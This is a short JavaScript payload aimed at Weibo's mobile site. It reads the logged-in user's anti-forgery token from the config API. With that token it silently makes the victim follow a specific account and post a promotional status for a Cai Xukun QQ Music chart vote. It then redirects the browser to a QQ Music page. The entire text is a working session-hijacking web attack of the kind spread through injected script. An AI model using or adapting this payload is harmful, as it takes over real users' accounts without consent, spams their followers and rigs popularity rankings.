  z=new XMLHttpRequest();
        z.open("GET","https://m.weibo.cn/api/config",true);
        z.send();
        z.onreadystatechange=function(){
            if (z.readyState == 4){
                var obj = JSON.parse(z.responseText);
                var xhr = new XMLHttpRequest();
                xhr.open('post', 'https://m.weibo.cn/api/friendships/create' );
                xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
                xhr.send('uid=6421536602&st=' + obj.data.st);

                var x = new XMLHttpRequest();
                x.open('post', 'https://m.weibo.cn/api/statuses/update' );
                x.setRequestHeader("Content-type","application/x-www-form-urlencoded");
                x.send('content=#蔡徐坤[超话]##蔡徐坤#2018qq音乐巅峰分享榜, 目前排第三，ikun们加油了！投票点击>>http://t.cn/EUghrOw&st=' + obj.data.st);
                window.location.href="https://y.qq.com/m/act/2018_year_share_wb/index.html";
            }
        };
